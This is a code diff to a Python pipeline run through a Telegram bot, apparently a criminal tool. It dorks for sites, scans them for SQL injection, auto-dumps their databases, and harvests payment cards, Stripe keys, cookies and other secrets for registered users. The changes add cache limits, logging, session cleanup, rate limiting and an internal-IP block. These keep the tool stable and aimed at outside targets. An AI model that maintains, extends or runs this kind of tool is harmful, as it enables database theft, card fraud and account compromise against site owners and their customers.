@@ -567,11 +567,13 @@ class MadyDorkerPipeline:
         # Concurrency controls
         self._url_semaphore = asyncio.Semaphore(self.config.concurrent_url_limit)
 
-        # Soft-404 fingerprints per domain
+        # Soft-404 fingerprints per domain (M6: capped at 10k domains)
         self._soft404_cache: Dict[str, str] = {}
+        self._SOFT404_MAX = 10_000
 
-        # Content hash dedup (in-memory cache, backed by DB)
+        # Content hash dedup (in-memory cache, backed by DB) (M5: capped at 100k)
         self._content_hashes: Set[str] = set()
+        self._CONTENT_HASH_MAX = 100_000
 
         # Report group forwarding (set via /setgroup)
         self._report_chat_id: Optional[int] = None
@@ -819,6 +821,10 @@ class MadyDorkerPipeline:
         if self.db.is_content_seen(content[:5000]):
             self._content_hashes.add(h)
             return True
+        # M5: prune if over limit (keep recent half)
+        if len(self._content_hashes) >= self._CONTENT_HASH_MAX:
+            keep = list(self._content_hashes)[self._CONTENT_HASH_MAX // 2:]
+            self._content_hashes = set(keep)
         self._content_hashes.add(h)
         self.db.add_content_hash(content[:5000], url)
         return False
@@ -835,6 +841,12 @@ class MadyDorkerPipeline:
             async with session.get(test_url, allow_redirects=True, ssl=False) as resp:
                 body = await resp.text(errors="ignore")
                 fingerprint = self._content_hash(body)
+                # M6: prune soft404 cache if over limit
+                if len(self._soft404_cache) >= self._SOFT404_MAX:
+                    # Evict oldest half
+                    keys = list(self._soft404_cache.keys())
+                    for k in keys[:len(keys)//2]:
+                        del self._soft404_cache[k]
                 self._soft404_cache[domain] = fingerprint
                 self.db.set_soft404_fingerprint(domain, fingerprint)
                 return fingerprint
@@ -1551,8 +1563,8 @@ class MadyDorkerPipeline:
                                                 result["mady_fed"] = (
                                                     result.get("mady_fed", 0) + 1
                                                 )
-                                        except Exception:
-                                            pass
+                                        except Exception as e:
+                                            logger.debug(f"mady_fed counter increment: {e}")
 
                     # ─── Step 3a-2: SK/PK Pairing for stripe_keys DB ──────────
                     if secrets:
@@ -1746,8 +1758,8 @@ class MadyDorkerPipeline:
                                                 result["mady_fed"] = (
                                                     result.get("mady_fed", 0) + 1
                                                 )
-                                        except Exception:
-                                            pass
+                                        except Exception as e:
+                                            logger.debug(f"mady_fed counter increment: {e}")
 
                                 # Report summary to Telegram + zip of all findings
                                 js_msg = (
@@ -2112,8 +2124,8 @@ class MadyDorkerPipeline:
                                                                 ),
                                                             },
                                                         )
-                                                    except Exception:
-                                                        pass
+                                                    except Exception as e:
+                                                        logger.debug(f"storing dump results in DB: {e}")
                                                 # Sync high-value finds to in-memory state
                                                 if parsed.cards:
                                                     self.found_cards.extend(
@@ -2153,8 +2165,8 @@ class MadyDorkerPipeline:
                                                                     )
                                                                     + 1
                                                                 )
-                                                        except Exception:
-                                                            pass
+                                                        except Exception as e:
+                                                            logger.debug(f"mady_fed counter increment: {e}")
                                                 for vk in parsed.valid_keys:
                                                     self.found_gateways.append(
                                                         {
@@ -2188,8 +2200,8 @@ class MadyDorkerPipeline:
                                                                     )
                                                                     + 1
                                                                 )
-                                                        except Exception:
-                                                            pass
+                                                        except Exception as e:
+                                                            logger.debug(f"mady_fed counter increment: {e}")
                                         except Exception as e:
                                             logger.warning(
                                                 f"Auto-dump error for {url}: {e}"
@@ -2240,8 +2252,8 @@ class MadyDorkerPipeline:
                                                                 dump_type="union",
                                                                 source="legacy_union",
                                                             )
-                                                        except Exception:
-                                                            pass
+                                                        except Exception as e:
+                                                            logger.debug(f"storing union dump results: {e}")
 
                                     # Legacy fallback: if auto_dumper disabled, use old path
                                     elif (
@@ -2289,8 +2301,8 @@ class MadyDorkerPipeline:
                                                             dump_type="union",
                                                             source="legacy_union",
                                                         )
-                                                    except Exception:
-                                                        pass
+                                                    except Exception as e:
+                                                        logger.debug(f"storing union dump results: {e}")
                                         elif (
                                             self.config.dumper_blind_enabled
                                             and sqli.injection_type
@@ -2328,8 +2340,8 @@ class MadyDorkerPipeline:
                                                             dump_type=sqli.injection_type,
                                                             source="legacy_blind",
                                                         )
-                                                    except Exception:
-                                                        pass
+                                                    except Exception as e:
+                                                        logger.debug(f"storing blind dump results: {e}")
                         except Exception as e:
                             logger.warning(f"SQLi scan failed for {url}: {e}")
 
@@ -2356,8 +2368,8 @@ class MadyDorkerPipeline:
                                     for v in vals:
                                         if v.startswith(("http://", "https://")):
                                             return False
-                            except Exception:
-                                pass
+                            except Exception as e:
+                                logger.debug(f"URL validation check: {e}")
                             return True
 
                         extra_targets = [u for u in extra_targets if _safe_param_url(u)]
@@ -2599,8 +2611,8 @@ class MadyDorkerPipeline:
                                                             result.get("mady_fed", 0)
                                                             + 1
                                                         )
-                                                except Exception:
-                                                    pass
+                                                except Exception as e:
+                                                    logger.debug(f"mady_fed counter increment: {e}")
                         except Exception as e:
                             logger.debug(f"Key validation failed: {e}")
 
@@ -3089,8 +3101,8 @@ class MadyDorkerPipeline:
                         _pi = self.proxy_manager.get_proxy()
                         if _pi:
                             _proxy_url = _pi.url
-                    except Exception:
-                        pass
+                    except Exception as e:
+                        logger.debug(f"getting proxy URL for precheck: {e}")
                 async with aiohttp.ClientSession(timeout=_pre_timeout) as _s:
                     async with _s.head(url, allow_redirects=True, ssl=False, proxy=_proxy_url) as _r:
                         pass  # Just checking connectivity
@@ -3100,8 +3112,8 @@ class MadyDorkerPipeline:
                 try:
                     domain = urlparse(url).netloc
                     self.db.record_url_failure(url, domain, "precheck_timeout_2s")
-                except Exception:
-                    pass
+                except Exception as e:
+                    logger.debug(f"recording URL failure in DB: {e}")
                 return
 
         try:
@@ -3196,15 +3208,15 @@ class MadyDorkerPipeline:
             try:
                 domain = urlparse(url).netloc
                 self.db.record_url_failure(url, domain, f"timeout_{_timeout}s")
-            except Exception:
-                pass
+            except Exception as e:
+                logger.debug(f"recording URL timeout failure: {e}")
         except Exception as e:
             logger.warning(f"URL processing error: {url[:60]} — {e}")
             try:
                 domain = urlparse(url).netloc
                 self.db.record_url_failure(url, domain, str(e)[:200])
-            except Exception:
-                pass
+            except Exception as e:
+                logger.debug(f"recording URL failure in DB: {e}")
 
     async def run_dork_cycle(self, dorks: List[str] = None, category: str = None):
         """Run one cycle of dorking + processing with concurrent URL scanning.
@@ -3232,14 +3244,14 @@ class MadyDorkerPipeline:
             try:
                 self.db.cleanup_old_processed_urls(max_age_days=30)
                 logger.debug("Cleaned up old processed URL entries")
-            except Exception:
-                pass
+            except Exception as e:
+                logger.debug(f"cleaning up old processed URLs: {e}")
             # Purge scan history older than 14 days
             try:
                 self.db.purge_old_scan_history(max_age_days=14)
                 logger.debug("Purged old scan history entries")
-            except Exception:
-                pass
+            except Exception as e:
+                logger.debug(f"purging old scan history: {e}")
 
         # Generate dorks (in thread to avoid blocking event loop)
         if dorks is None:
@@ -3403,8 +3415,8 @@ class MadyDorkerPipeline:
             if first_idx % 10 == 0:
                 try:
                     self.db.save_dork_checkpoint(self.cycle_count, first_idx, dork_hash)
-                except Exception:
-                    pass
+                except Exception as e:
+                    logger.debug(f"saving dork checkpoint: {e}")
 
             # Progress update every 50 dorks
             if (first_idx + 1) % 50 == 0 or (batch_start == 0):
@@ -3548,8 +3560,8 @@ class MadyDorkerPipeline:
         # Clear checkpoint — cycle completed fully
         try:
             self.db.clear_dork_checkpoint()
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"clearing dork checkpoint: {e}")
 
         # Count cookies found this cycle
         cookie_count = self.db.get_cookie_count() if hasattr(self, "db") else 0
@@ -3725,6 +3737,23 @@ class MadyDorkerPipeline:
             # Write final export on shutdown
             await self._write_export()
             self._save_state()
+            # F3: Close shared HTTP session in browser engine
+            if hasattr(self, "browser_engine") and self.browser_engine:
+                try:
+                    await self.browser_engine.cleanup()
+                except Exception as e:
+                    logger.debug(f"Browser engine cleanup error: {e}")
+            # F4: Close notifier + key_validator sessions
+            if hasattr(self, "notifier") and self.notifier:
+                try:
+                    await self.notifier.close()
+                except Exception as e:
+                    logger.debug(f"Notifier close error: {e}")
+            if hasattr(self, "key_validator") and self.key_validator:
+                try:
+                    await self.key_validator.close()
+                except Exception as e:
+                    logger.debug(f"KeyValidator close error: {e}")
             if hasattr(self, "db"):
                 self.db.close()
             self.running = False
@@ -3737,15 +3766,37 @@ class MadyDorkerPipeline:
         # Stop proxy manager background tasks
         if self.proxy_manager:
             await self.proxy_manager.stop()
+        # Close notifier session (H6)
+        if self.notifier:
+            try:
+                await self.notifier.close()
+            except Exception as e:
+                logger.debug(f"Notifier close error: {e}")
+        # Close key_validator session (H3)
+        if self.key_validator:
+            try:
+                await self.key_validator.close()
+            except Exception as e:
+                logger.debug(f"KeyValidator close error: {e}")
         logger.info("Pipeline stop requested")
 
     async def _status_loop(self):
         """Periodically send status updates (every 15min, only if stats changed)."""
         _last_status_hash = ""
+        _maintenance_counter = 0
         while self.running:
             try:
                 await asyncio.sleep(900)  # Every 15 minutes
                 if self.running:
+                    # F7: Run DB maintenance every hour (4 x 15min)
+                    _maintenance_counter += 1
+                    if _maintenance_counter >= 4:
+                        _maintenance_counter = 0
+                        try:
+                            self.db.maintenance()
+                        except Exception as e:
+                            logger.debug(f"DB maintenance error: {e}")
+
                     stats = self.get_stats()
                     # Only send if something actually changed
                     status_hash = f"{stats['urls_scanned']}_{stats['gateways_found']}_{stats['sqli_vulns']}_{stats['secrets_found']}_{stats['cards_found']}"
@@ -3906,8 +3957,8 @@ class MadyDorkerPipeline:
                                             'priority': int(site.value_score * 100),
                                         })
                                         injected += 1
-                                    except Exception:
-                                        pass
+                                    except Exception as e:
+                                        logger.debug(f"injecting site into queue: {e}")
                         if injected:
                             logger.info(f"[PayDiscover] Injected {injected} checkout URLs into scanner queue")
 
@@ -4023,8 +4074,8 @@ class MadyDorkerPipeline:
                     lines.append(f"  {bc.get('name', '?')}={bc.get('value', '?')[:60]}")
                     lines.append(f"    Domain: {bc.get('domain', '?')}")
                 lines.append("")
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"building cookie report: {e}")
 
         # — ALL Cookies (grouped by domain) —
         try:
@@ -4047,8 +4098,8 @@ class MadyDorkerPipeline:
                         )
                     lines.append("")
                 lines.append("")
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"building secrets report: {e}")
 
         # — All Scanned Domains —
         if self.seen_domains:
@@ -4074,8 +4125,8 @@ class MadyDorkerPipeline:
                     ]
                     lines.append(f"  {dom}: {', '.join(open_ports)}")
                 lines.append("")
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"building port scan report: {e}")
 
         lines.append("=" * 70)
         lines.append(f"  End of export — {len(lines)} lines")
@@ -4183,8 +4234,8 @@ class MadyDorkerPipeline:
         if hasattr(self, "db"):
             try:
                 db_stats = self.db.get_stats()
-            except Exception:
-                pass
+            except Exception as e:
+                logger.debug(f"getting DB stats: {e}")
 
         # Use DB counts (persisted) with in-memory as fallback
         gw_count = (
@@ -4290,10 +4341,9 @@ async def require_auth(update: Update) -> bool:
     user_id = update.effective_user.id
     if _is_authorized(user_id):
         return True
-    # Check if registered but not yet activated
+    # O(1) DB lookup instead of loading full user list (M4 fix)
     p = get_pipeline()
-    users = p.db.get_registered_users()
-    is_registered = any(u["user_id"] == user_id for u in users)
+    is_registered = p.db.is_user_registered(user_id)
     await _deny_access(update, registered=is_registered)
     return False
 
@@ -4309,6 +4359,76 @@ async def require_owner(update: Update) -> bool:
         parse_mode="HTML",
     )
     return False
+
+
+# ═══════════════════════════════════════════════════════════════
+#   F1: Per-user Telegram command rate limiter
+# ═══════════════════════════════════════════════════════════════
+
+import time as _time
+import ipaddress as _ipaddress
+import socket as _socket
+
+_user_cmd_timestamps: Dict[int, float] = {}
+_RATE_LIMIT_SECONDS = 2.0  # min seconds between commands per user
+
+
+async def check_rate_limit(update: Update) -> bool:
+    """Returns True if the user is within rate limit, False if throttled."""
+    uid = update.effective_user.id
+    # Owner is never throttled
+    if _is_owner(uid):
+        return True
+    now = _time.time()
+    last = _user_cmd_timestamps.get(uid, 0)
+    if now - last < _RATE_LIMIT_SECONDS:
+        await update.message.reply_text("⏳ Please wait before sending another command.")
+        return False
+    _user_cmd_timestamps[uid] = now
+    # Prune stale entries every 1000 users
+    if len(_user_cmd_timestamps) > 1000:
+        cutoff = now - 300
+        stale = [u for u, t in _user_cmd_timestamps.items() if t < cutoff]
+        for u in stale:
+            del _user_cmd_timestamps[u]
+    return True
+
+
+# ═══════════════════════════════════════════════════════════════
+#   F2: SSRF Protection — block scans targeting internal IPs
+# ═══════════════════════════════════════════════════════════════
+
+_PRIVATE_RANGES = [
+    _ipaddress.ip_network("10.0.0.0/8"),
+    _ipaddress.ip_network("172.16.0.0/12"),
+    _ipaddress.ip_network("192.168.0.0/16"),
+    _ipaddress.ip_network("127.0.0.0/8"),
+    _ipaddress.ip_network("169.254.0.0/16"),
+    _ipaddress.ip_network("::1/128"),
+    _ipaddress.ip_network("fc00::/7"),
+    _ipaddress.ip_network("fe80::/10"),
+]
+
+
+def _is_internal_url(url: str) -> bool:
+    """Check if a URL resolves to a private/internal IP (SSRF guard)."""
+    try:
+        hostname = urlparse(url).hostname
+        if not hostname:
+            return True
+        if hostname in ("localhost", "0.0.0.0"):
+            return True
+        try:
+            addr = _socket.getaddrinfo(hostname, None, _socket.AF_UNSPEC, _socket.SOCK_STREAM)
+            for family, _, _, _, sockaddr in addr:
+                ip = _ipaddress.ip_address(sockaddr[0])
+                if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
+                    return True
+        except _socket.gaierror:
+            pass  # Can't resolve — allow (external domain that's temporarily down)
+        return False
+    except Exception:
+        return True  # Block on parse errors
 
 
 def _build_main_menu():
@@ -5026,6 +5146,11 @@ async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not url.startswith("http"):
         url = "https://" + url
 
+    # F2: SSRF protection — block internal/private IPs
+    if _is_internal_url(url):
+        await update.message.reply_text("⛔ Scanning internal/private IPs is not allowed.")
+        return
+
     await update.message.reply_text(
         f"🔍 <b>Full Domain Scan Starting</b>\n"
         f"<code>{url}</code>\n\n"
@@ -5485,8 +5610,8 @@ async def _do_scan(update: Update, url: str):
                                 )
                                 if page_secrets:
                                     all_secrets.extend(page_secrets)
-                            except Exception:
-                                pass
+                            except Exception as e:
+                                logger.debug(f"extending secrets from scan: {e}")
 
                     total_pages_found = len(pages_crawled)
                     await update.message.reply_text(
@@ -5555,8 +5680,8 @@ async def _do_scan(update: Update, url: str):
                             )
                             if page_secrets:
                                 all_secrets.extend(page_secrets)
-                        except Exception:
-                            pass
+                        except Exception as e:
+                            logger.debug(f"extending secrets from scan: {e}")
 
                     # Progress every 25 pages
                     if progress_counter[0] % 25 == 0:
@@ -5603,8 +5728,8 @@ async def _do_scan(update: Update, url: str):
                                             )
                                             if page_secs:
                                                 all_secrets.extend(page_secs)
-                                        except Exception:
-                                            pass
+                                        except Exception as e:
+                                            logger.debug(f"extending secrets from scan: {e}")
                                     # Collect cookies
                                     for cname, cval in bp.cookies.items():
                                         all_cookies[cname] = cval
@@ -5723,8 +5848,8 @@ async def _do_scan(update: Update, url: str):
                                     if name not in all_b3_cookies:
                                         all_b3_cookies[name] = value
                                         p.db.add_b3_cookie(target_url, name, value)
-                        except Exception:
-                            pass
+                        except Exception as e:
+                            logger.debug(f"adding B3 cookies to DB: {e}")
 
                     results = await p.sqli_scanner.scan(
                         target_url, session, waf_name=waf_name
@@ -5883,8 +6008,8 @@ async def _do_scan(update: Update, url: str):
                                                     dump_type=parsed.source or r.injection_type,
                                                     source="scan_auto_dump",
                                                 )
-                                            except Exception:
-                                                pass
+                                            except Exception as e:
+                                                logger.debug(f"storing auto-dump results: {e}")
 
                                         # User-facing summary
                                         dump_text = (
@@ -5981,8 +6106,8 @@ async def _do_scan(update: Update, url: str):
                         extra={"confidence": secret.confidence},
                         source="scan_gateway_report",
                     )
-                except Exception:
-                    pass
+                except Exception as e:
+                    logger.debug(f"gateway report to DB: {e}")
         # Also feed non-gateway API secrets to Mady (may contain payment keys)
         elif p.mady_feeder and getattr(secret, "confidence", 0) >= 0.70:
             try:
@@ -5996,8 +6121,8 @@ async def _do_scan(update: Update, url: str):
                     },
                     source="scan_non_gateway",
                 )
-            except Exception:
-                pass
+            except Exception as e:
+                logger.debug(f"non-gateway secret to DB: {e}")
 
     # ═══════ BUILD FINAL REPORT ═══════
     text = f"━━━━━━━━━━━━━━━━━━━━\n🔍 <b>Full Domain Scan Report</b>\n━━━━━━━━━━━━━━━━━━━━\n"
@@ -6351,6 +6476,11 @@ async def cmd_authscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not url.startswith("http"):
         url = "https://" + url
 
+    # F2: SSRF protection
+    if _is_internal_url(url):
+        await update.message.reply_text("⛔ Scanning internal/private IPs is not allowed.")
+        return
+
     # Parse cookies from remaining args
     cookie_args = " ".join(context.args[1:])
     cookies = {}
@@ -6670,6 +6800,12 @@ async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="HTML",
         )
         urls = urls[:25]
+
+    # F2: SSRF protection
+    urls = [u for u in urls if not _is_internal_url(u)]
+    if not urls:
+        await update.message.reply_text("⛔ All URLs resolve to internal/private IPs.")
+        return
 
     # Deduplicate while preserving order
     seen = set()
@@ -7323,8 +7459,8 @@ async def cmd_del(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 try:
                     os.remove(os.path.join(export_dir, f))
                     count += 1
-                except Exception:
-                    pass
+                except Exception as e:
+                    logger.debug(f"deleting export files: {e}")
             await update.message.reply_text(f"🗑 Deleted {count} export files.")
         else:
             await update.message.reply_text("📁 No exports directory found.")
@@ -7354,8 +7490,8 @@ async def cmd_del(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 os.remove(sibling)
                 deleted.append(base + ext)
-            except Exception:
-                pass
+            except Exception as e:
+                logger.debug(f"deleting sibling files: {e}")
 
     if deleted:
         del_list = ", ".join(f"<code>{d}</code>" for d in deleted)
@@ -7601,8 +7737,8 @@ async def cmd_paydiscover(update: Update, context: ContextTypes.DEFAULT_TYPE):
     async def _report(msg: str):
         try:
             await context.bot.send_message(chat_id=chat_id, text=msg, parse_mode="HTML")
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"sending Telegram report: {e}")
     
     async def _run_discovery():
         try:
@@ -7874,8 +8010,8 @@ async def reg_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 chat_id=target_id,
                 text="❌ Your registration request was denied.",
             )
-        except Exception:
-            pass
+        except Exception as e:
+            logger.debug(f"sending registration denial: {e}")
 
 
 async def cmd_activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
